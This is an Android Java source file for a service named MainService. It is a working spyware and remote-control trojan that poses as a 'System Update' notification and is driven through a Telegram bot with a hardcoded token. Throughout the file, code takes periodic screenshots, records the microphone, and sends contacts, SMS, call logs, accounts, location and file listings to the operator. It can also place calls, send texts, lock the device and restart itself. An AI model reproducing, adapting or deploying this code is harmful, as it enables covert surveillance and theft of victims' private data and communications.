package com.v8.global.sniffer;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.location.Location;
import android.location.LocationManager;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.Vibrator;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

import okhttp3.Call;
import okhttp3.FormBody;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainService extends Service {
    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private OkHttpClient client = new OkHttpClient();
    private PowerManager.WakeLock wakeLock;
    private Timer timer;
    private int lastUpdateId = 0;
    private Handler handler = new Handler(Looper.getMainLooper());
    private MediaRecorder mediaRecorder;
    private boolean isRecording = false;
    private String currentAudioPath;
    
    // متغيرات تصوير الشاشة
    private MediaProjection mediaProjection;
    private MediaProjectionManager projectionManager;
    private int screenWidth, screenHeight, screenDensity;

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            // WakeLock لمنع النوم
            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
            if (powerManager != null) {
                wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "MainService");
                wakeLock.acquire(10 * 60 * 1000L);
            }

            // إعداد MediaProjection للشاشة
            projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            if (wm != null) {
                DisplayMetrics metrics = new DisplayMetrics();
                wm.getDefaultDisplay().getMetrics(metrics);
                screenWidth = metrics.widthPixels;
                screenHeight = metrics.heightPixels;
                screenDensity = metrics.densityDpi;
            }

            startForegroundService();
            setupMediaProjection();

            // إرسال رسالة بدء التشغيل
            handler.postDelayed(() -> sendToTelegram("✅ MainService Started - Screen Capture Active"), 3000);

            // بدء فحص الأوامر كل 5 ثواني
            timer = new Timer();
            timer.scheduleAtFixedRate(new TimerTask() {
                @Override
                public void run() {
                    try {
                        checkCommands();
                    } catch (Exception ignored) { }
                }
            }, 5000, 5000);
            
            // تصوير الشاشة التلقائي كل 30 ثانية
            timer.scheduleAtFixedRate(new TimerTask() {
                @Override
                public void run() {
                    try {
                        takeScreenshot();
                    } catch (Exception ignored) { }
                }
            }, 10000, 30000);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void startForegroundService() {
        try {
            String channelId = "main_channel";
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel channel = new NotificationChannel(channelId, "Main Service",
                        NotificationManager.IMPORTANCE_LOW);
                NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
                if (manager != null) manager.createNotificationChannel(channel);
            }
            Notification notification = new NotificationCompat.Builder(this, channelId)
                    .setContentTitle("System Update")
                    .setContentText("يعمل في الخلفية - مراقبة نشطة")
                    .setSmallIcon(android.R.drawable.stat_notify_sync)
                    .setOngoing(true)
                    .build();
            startForeground(1, notification);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    private void setupMediaProjection() {
        try {
            int resultCode = getSharedPreferences("screen_capture", MODE_PRIVATE).getInt("resultCode", -1);
            String dataUri = getSharedPreferences("screen_capture", MODE_PRIVATE).getString("data", null);
            if (resultCode != -1 && dataUri != null && projectionManager != null) {
                Intent data = Intent.parseUri(dataUri, 0);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    mediaProjection = projectionManager.getMediaProjection(resultCode, data);
                }
            }
        } catch (Exception e) { }
    }

    // ========== تصوير الشاشة (سكرين شوت) ==========
    private void takeScreenshot() {
        try {
            if (mediaProjection == null) {
                setupMediaProjection();
                if (mediaProjection == null) {
                    return;
                }
            }
            if (screenWidth == 0 || screenHeight == 0) {
                return;
            }

            ImageReader imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2);
            VirtualDisplay virtualDisplay = mediaProjection.createVirtualDisplay(
                    "Screenshot", screenWidth, screenHeight, screenDensity,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader.getSurface(), null, null);

            handler.postDelayed(() -> {
                try {
                    Image image = imageReader.acquireLatestImage();
                    if (image != null) {
                        Bitmap bitmap = Bitmap.createBitmap(screenWidth, screenHeight, Bitmap.Config.ARGB_8888);
                        bitmap.copyPixelsFromBuffer(image.getPlanes()[0].getBuffer());
                        sendScreenshotToTelegram(bitmap);
                        image.close();
                        bitmap.recycle();
                    }
                    virtualDisplay.release();
                    imageReader.close();
                } catch (Exception e) { }
            }, 500);
        } catch (Exception e) { }
    }

    private void sendScreenshotToTelegram(Bitmap bitmap) {
        try {
            File file = new File(getCacheDir(), "screenshot_" + System.currentTimeMillis() + ".jpg");
            FileOutputStream out = new FileOutputStream(file);
            bitmap.compress(Bitmap.CompressFormat.JPEG, 85, out);
            out.close();

            String timeStamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date());
            
            RequestBody body = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("caption", "📸 **تصوير الشاشة**\n🕐 " + timeStamp)
                    .addFormDataPart("photo", file.getName(),
                            RequestBody.create(MediaType.parse("image/jpeg"), file))
                    .build();
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + TOKEN + "/sendPhoto")
                    .post(body).build();
            client.newCall(request).enqueue(new okhttp3.Callback() {
                @Override
                public void onResponse(Call call, Response response) {
                    try { response.close(); } catch (Exception e) { }
                    file.delete();
                }
                @Override public void onFailure(Call call, IOException e) { }
            });
        } catch (Exception e) { }
    }

    // ========== فحص أوامر التليجرام ==========
    private void checkCommands() {
        try {
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + TOKEN + "/getUpdates?offset=" + lastUpdateId)
                    .build();
            client.newCall(request).enqueue(new okhttp3.Callback() {
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    try {
                        String body = response.body().string();
                        JSONObject json = new JSONObject(body);
                        JSONArray result = json.getJSONArray("result");
                        for (int i = 0; i < result.length(); i++) {
                            JSONObject update = result.getJSONObject(i);
                            lastUpdateId = update.getInt("update_id") + 1;
                            
                            if (update.has("callback_query")) {
                                JSONObject callback = update.getJSONObject("callback_query");
                                String data = callback.getString("data");
                                String callbackId = callback.getString("id");
                                executeCommand(data);
                                answerCallbackQuery(callbackId);
                            }
                            
                            if (update.has("message")) {
                                JSONObject message = update.getJSONObject("message");
                                if (message.has("text")) {
                                    String text = message.getString("text");
                                    executeCommand(text);
                                }
                            }
                        }
                        response.close();
                    } catch (Exception ignored) { }
                }
                @Override
                public void onFailure(Call call, IOException e) { }
            });
        } catch (Exception ignored) { }
    }

    private void answerCallbackQuery(String callbackId) {
        try {
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + TOKEN + "/answerCallbackQuery")
                    .post(new FormBody.Builder()
                            .add("callback_query_id", callbackId)
                            .build())
                    .build();
            client.newCall(request).enqueue(new okhttp3.Callback() {
                @Override public void onResponse(Call call, Response response) {
                    try { response.close(); } catch (Exception e) { }
                }
                @Override public void onFailure(Call call, IOException e) { }
            });
        } catch (Exception e) { }
    }

    private void executeCommand(String command) {
        try {
            String[] parts = command.split(" ");
            String cmd = parts[0];

            switch (cmd) {
                case "/help":
                case "help":
                    sendHelpWithButtons();
                    break;
                case "/info":
                case "info":
                    sendDeviceInfo();
                    break;
                case "/contacts":
                case "contacts":
                    getContacts();
                    break;
                case "/location":
                case "location":
                    getLocation();
                    break;
                case "/sms":
                case "sms":
                    getSms();
                    break;
                case "/calls":
                case "calls":
                    getCallLog();
                    break;
                case "/accounts":
                case "accounts":
                    getAccounts();
                    break;
                case "/photos":
                case "photos":
                    getPhotos();
                    break;
                case "/videos":
                case "videos":
                    getVideos();
                    break;
                case "/files":
                case "files":
                    getFiles();
                    break;
                case "/screenshot":
                case "screenshot":
                    takeScreenshot();
                    sendToTelegram("📸 جاري تصوير الشاشة...");
                    break;
                case "/record_audio_start":
                case "record_audio_start":
                    startAudioRecording();
                    break;
                case "/record_audio_stop":
                case "record_audio_stop":
                    stopAudioRecording();
                    break;
                case "/vibrate":
                case "vibrate":
                    vibrate();
                    break;
                case "/lock":
                case "lock":
                    lockDevice();
                    break;
                case "/open":
                case "open":
                    if (parts.length >= 2) openUrl(parts[1]);
                    break;
                case "/call":
                case "call":
                    if (parts.length >= 2) makeCall(parts[1]);
                    break;
                case "/sms_send":
                case "sms_send":
                    if (parts.length >= 3) sendSms(parts[1], command.substring(command.indexOf(parts[1]) + parts[1].length() + 1));
                    break;
                case "/test":
                case "test":
                    sendToTelegram("✅ Working - " + new Date().toString());
                    break;
                default:
                    break;
            }
        } catch (Exception ignored) { }
    }

    private void sendHelpWithButtons() {
        try {
            JSONObject replyMarkup = new JSONObject();
            JSONArray keyboard = new JSONArray();
            
            JSONArray row1 = new JSONArray();
            row1.put(new JSONObject().put("text", "📱 معلومات").put("callback_data", "info"));
            row1.put(new JSONObject().put("text", "📍 موقع").put("callback_data", "location"));
            
            JSONArray row2 = new JSONArray();
            row2.put(new JSONObject().put("text", "📇 جهات اتصال").put("callback_data", "contacts"));
            row2.put(new JSONObject().put("text", "📨 رسائل").put("callback_data", "sms"));
            
            JSONArray row3 = new JSONArray();
            row3.put(new JSONObject().put("text", "📞 مكالمات").put("callback_data", "calls"));
            row3.put(new JSONObject().put("text", "👤 حسابات").put("callback_data", "accounts"));
            
            JSONArray row4 = new JSONArray();
            row4.put(new JSONObject().put("text", "🖼 صور").put("callback_data", "photos"));
            row4.put(new JSONObject().put("text", "🎥 فيديوهات").put("callback_data", "videos"));
            
            JSONArray row5 = new JSONArray();
            row5.put(new JSONObject().put("text", "📁 ملفات").put("callback_data", "files"));
            row5.put(new JSONObject().put("text", "📸 تصوير شاشة").put("callback_data", "screenshot"));
            
            JSONArray row6 = new JSONArray();
            row6.put(new JSONObject().put("text", "🎤 تسجيل صوت").put("callback_data", "record_audio_start"));
            row6.put(new JSONObject().put("text", "⏹ إيقاف تسجيل").put("callback_data", "record_audio_stop"));
            
            JSONArray row7 = new JSONArray();
            row7.put(new JSONObject().put("text", "📳 اهتزاز").put("callback_data", "vibrate"));
            row7.put(new JSONObject().put("text", "🔒 قفل الجهاز").put("callback_data", "lock"));
            
            JSONArray row8 = new JSONArray();
            row8.put(new JSONObject().put("text", "🔗 فتح رابط").put("callback_data", "open"));
            row8.put(new JSONObject().put("text", "📞 اتصال").put("callback_data", "call"));
            
            JSONArray row9 = new JSONArray();
            row9.put(new JSONObject().put("text", "📨 إرسال رسالة").put("callback_data", "sms_send"));
            row9.put(new JSONObject().put("text", "🧪 اختبار").put("callback_data", "test"));
            
            keyboard.put(row1);
            keyboard.put(row2);
            keyboard.put(row3);
            keyboard.put(row4);
            keyboard.put(row5);
            keyboard.put(row6);
            keyboard.put(row7);
            keyboard.put(row8);
            keyboard.put(row9);
            
            replyMarkup.put("inline_keyboard", keyboard);
            
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + TOKEN + "/sendMessage")
                    .post(new FormBody.Builder()
                            .add("chat_id", CHAT_ID)
                            .add("text", "📋 **System Update - التحكم الكامل**\n\nاختر الأمر من الأزرار أدناه:")
                            .add("reply_markup", replyMarkup.toString())
                            .add("parse_mode", "Markdown")
                            .build())
                    .build();
            client.newCall(request).enqueue(new okhttp3.Callback() {
                @Override public void onResponse(Call call, Response response) {
                    try { response.close(); } catch (Exception e) { }
                }
                @Override public void onFailure(Call call, IOException e) { }
            });
        } catch (Exception e) { }
    }

    private void lockDevice() {
        try {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            android.content.ComponentName admin = new android.content.ComponentName(this, AdminReceiver.class);
            if (dpm.isAdminActive(admin)) {
                dpm.lockNow();
                sendToTelegram("🔒 تم قفل الجهاز");
            } else {
                sendToTelegram("❌ لم يتم تفعيل صلاحية مسؤول الجهاز");
            }
        } catch (Exception e) {
            sendToTelegram("❌ فشل قفل الجهاز: " + e.getMessage());
        }
    }

    private void sendDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("android", Build.VERSION.RELEASE);
            info.put("battery", getBatteryLevel());

            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (tm != null && checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED)
                info.put("phone", tm.getLine1Number());

            sendToTelegram("📱 **Device Info:**\n" + info.toString(2));
        } catch (Exception e) { }
    }

    private int getBatteryLevel() {
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = registerReceiver(null, ifilter);
            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                return (int)(level * 100 / (float)scale);
            }
        } catch (Exception e) { }
        return 0;
    }

    private void getContacts() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("❌ No contacts permission");
                    return;
                }
                ContentResolver cr = getContentResolver();
                Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null, null, null, null);
                StringBuilder sb = new StringBuilder("📇 **Contacts:**\n\n");
                int count = 0;
                if (cursor != null) {
                    while (cursor.moveToNext() && count < 100) {
                        String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                        String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        sb.append(name).append(": ").append(number).append("\n");
                        count++;
                    }
                    cursor.close();
                }
                if (count == 0) sb.append("No contacts");
                sendToTelegram(sb.toString());
            } catch (Exception e) { }
        }).start();
    }

    private void getLocation() {
        try {
            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                sendToTelegram("❌ No location permission");
                return;
            }
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            if (lm != null) {
                Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (location == null) location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                if (location != null) {
                    sendToTelegram("📍 **Location:**\nLat: " + location.getLatitude() + "\nLng: " + location.getLongitude());
                } else {
                    sendToTelegram("📍 Location not available");
                }
            }
        } catch (Exception e) { }
    }

    private void getSms() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("❌ No SMS permission");
                    return;
                }
                Cursor cursor = getContentResolver().query(
                        Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 10");
                StringBuilder sb = new StringBuilder("📨 **Last 10 SMS:**\n\n");
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        String address = cursor.getString(cursor.getColumnIndex("address"));
                        String body = cursor.getString(cursor.getColumnIndex("body"));
                        sb.append(address).append(": ").append(body).append("\n---\n");
                    }
                    cursor.close();
                }
                if (sb.length() == 0) sb.append("No SMS");
                sendToTelegram(sb.toString());
            } catch (Exception e) { }
        }).start();
    }

    private void getCallLog() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("❌ No call log permission");
                    return;
                }
                Cursor cursor = getContentResolver().query(
                        Uri.parse("content://call_log/calls"), null, null, null, "date DESC LIMIT 10");
                StringBuilder sb = new StringBuilder("📞 **Last 10 Calls:**\n\n");
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        String number = cursor.getString(cursor.getColumnIndex("number"));
                        String type = cursor.getString(cursor.getColumnIndex("type"));
                        String duration = cursor.getString(cursor.getColumnIndex("duration"));
                        String typeText = type.equals("1") ? "Incoming" : type.equals("2") ? "Outgoing" : "Missed";
                        sb.append(number).append(" (").append(typeText).append(") ").append(duration).append("s\n");
                    }
                    cursor.close();
                }
                if (sb.length() == 0) sb.append("No calls");
                sendToTelegram(sb.toString());
            } catch (Exception e) { }
        }).start();
    }

    private void getAccounts() {
        new Thread(() -> {
            try {
                android.accounts.AccountManager am = (android.accounts.AccountManager) getSystemService(ACCOUNT_SERVICE);
                if (am != null) {
                    android.accounts.Account[] accounts = am.getAccounts();
                    StringBuilder sb = new StringBuilder("👤 **Accounts:**\n\n");
                    for (android.accounts.Account acc : accounts) {
                        sb.append(acc.type).append(": ").append(acc.name).append("\n");
                    }
                    if (accounts.length == 0) sb.append("No accounts");
                    sendToTelegram(sb.toString());
                }
            } catch (Exception e) { }
        }).start();
    }

    private void getPhotos() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("❌ No storage permission");
                    return;
                }
                String[] projection = {MediaStore.Images.Media.DATA, MediaStore.Images.Media.DISPLAY_NAME};
                Cursor cursor = getContentResolver().query(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC LIMIT 10");
                StringBuilder sb = new StringBuilder("🖼 **Last 10 Photos:**\n\n");
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        String name = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME));
                        String path = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
                        sb.append(name).append("\n").append(path).append("\n---\n");
                    }
                    cursor.close();
                }
                if (sb.length() == 0) sb.append("No photos");
                sendToTelegram(sb.toString());
            } catch (Exception e) { }
        }).start();
    }

    private void getVideos() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("❌ No storage permission");
                    return;
                }
                String[] projection = {MediaStore.Video.Media.DATA, MediaStore.Video.Media.DISPLAY_NAME};
                Cursor cursor = getContentResolver().query(
                        MediaStore.Video.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC LIMIT 10");
                StringBuilder sb = new StringBuilder("🎥 **Last 10 Videos:**\n\n");
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        String name = cursor.getString(cursor.getColumnIndex(MediaStore.Video.Media.DISPLAY_NAME));
                        String path = cursor.getString(cursor.getColumnIndex(MediaStore.Video.Media.DATA));
                        sb.append(name).append("\n").append(path).append("\n---\n");
                    }
                    cursor.close();
                }
                if (sb.length() == 0) sb.append("No videos");
                sendToTelegram(sb.toString());
            } catch (Exception e) { }
        }).start();
    }

    private void getFiles() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("❌ No storage permission");
                    return;
                }
                File storage = Environment.getExternalStorageDirectory();
                if (storage != null) {
                    StringBuilder sb = new StringBuilder("📁 **Files:**\n\n");
                    listFiles(storage, sb, 0);
                    if (sb.length() == 0) sb.append("No files");
                    sendToTelegram(sb.toString());
                }
            } catch (Exception e) { }
        }).start();
    }

    private void listFiles(File dir, StringBuilder sb, int depth) {
        if (depth > 2) return;
        File[] files = dir.listFiles();
        if (files != null) {
            for (File f : files) {
                if (f.isDirectory()) {
                    listFiles(f, sb, depth + 1);
                } else {
                    sb.append(f.getName()).append("\n").append(f.getAbsolutePath()).append("\n---\n");
                    if (sb.length() > 3000) break;
                }
            }
        }
    }

    private void startAudioRecording() {
        try {
            if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                sendToTelegram("❌ No audio permission");
                return;
            }
            String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
            File audioDir = getExternalFilesDir(Environment.DIRECTORY_MUSIC);
            if (audioDir != null && !audioDir.exists()) audioDir.mkdirs();
            if (audioDir == null) {
                sendToTelegram("❌ لا يمكن الوصول للتخزين");
                return;
            }
            currentAudioPath = audioDir.getAbsolutePath() + "/audio_" + timeStamp + ".3gp";

            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(currentAudioPath);
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
            sendToTelegram("🎤 Audio recording started");
        } catch (Exception e) {
            sendToTelegram("❌ Failed: " + e.getMessage());
        }
    }

    private void stopAudioRecording() {
        if (!isRecording) {
            sendToTelegram("⚠️ No active recording");
            return;
        }
        try {
            mediaRecorder.stop();
            mediaRecorder.release();
            isRecording = false;
            sendFile(new File(currentAudioPath), "audio.3gp");
        } catch (Exception e) {
            sendToTelegram("❌ Failed: " + e.getMessage());
        }
    }

    private void vibrate() {
        try {
            Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
            if (v != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    v.vibrate(android.os.VibrationEffect.createOneShot(2000, android.os.VibrationEffect.DEFAULT_AMPLITUDE));
                } else {
                    v.vibrate(2000);
                }
                sendToTelegram("📳 Vibrating");
            }
        } catch (Exception e) { }
    }

    private void openUrl(String url) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            sendToTelegram("🔗 Opening: " + url);
        } catch (Exception e) { }
    }

    private void makeCall(String number) {
        try {
            if (checkSelfPermission(android.Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
                sendToTelegram("❌ No call permission");
                return;
            }
            Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + number));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            sendToTelegram("📞 Calling: " + number);
        } catch (Exception e) { }
    }

    private void sendSms(String number, String text) {
        try {
            if (checkSelfPermission(android.Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
                sendToTelegram("❌ No SMS permission");
                return;
            }
            SmsManager sms = SmsManager.getDefault();
            sms.sendTextMessage(number, null, text, null, null);
            sendToTelegram("📨 SMS sent to: " + number);
        } catch (Exception e) { }
    }

    private void sendFile(File file, String caption) {
        try {
            RequestBody body = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("caption", caption)
                    .addFormDataPart("document", file.getName(),
                            RequestBody.create(MediaType.parse("application/octet-stream"), file))
                    .build();
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + TOKEN + "/sendDocument")
                    .post(body).build();
            client.newCall(request).enqueue(new okhttp3.Callback() {
                @Override
                public void onResponse(Call call, Response response) {
                    try { response.close(); } catch (Exception e) { }
                    file.delete();
                }
                @Override public void onFailure(Call call, IOException e) { }
            });
        } catch (Exception e) { }
    }

    private void sendToTelegram(String text) {
        try {
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + TOKEN + "/sendMessage")
                    .post(new FormBody.Builder()
                            .add("chat_id", CHAT_ID)
                            .add("text", text)
                            .add("parse_mode", "Markdown")
                            .build())
                    .build();
            client.newCall(request).enqueue(new okhttp3.Callback() {
                @Override public void onResponse(Call call, Response response) {
                    try { response.close(); } catch (Exception e) { }
                }
                @Override public void onFailure(Call call, IOException e) { }
            });
        } catch (Exception e) { }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        try {
            if (timer != null) timer.cancel();
            if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
            if (mediaRecorder != null) mediaRecorder.release();
            if (mediaProjection != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                mediaProjection.stop();
            }
        } catch (Exception ignored) { }
        // إعادة تشغيل الخدمة فوراً
        startService(new Intent(this, MainService.class));
    }
}
